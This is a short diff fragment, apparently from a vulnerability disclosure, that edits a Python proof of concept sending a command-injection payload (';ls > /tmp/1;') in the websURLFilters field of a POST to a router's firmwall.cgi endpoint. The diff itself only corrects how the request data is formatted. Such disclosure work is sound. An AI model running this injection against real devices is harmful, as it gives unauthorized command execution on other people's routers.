@@ -32,5 +32,5 @@ we can set websURLFilters in function websURLFilter via parameter websURLFilters
 url = "http://192.168.0.1/cgi-bin/firmwall.cgi"
 payload = ';ls > /tmp/1;' + '\n'
 
-r = requests.post(url, data={ 'page=websURLFilter&websURLFilters=' + payload})
+r = requests.post(url, data={ 'page':'websURLFilter', 'websURLFilters':  payload})
 ``` 
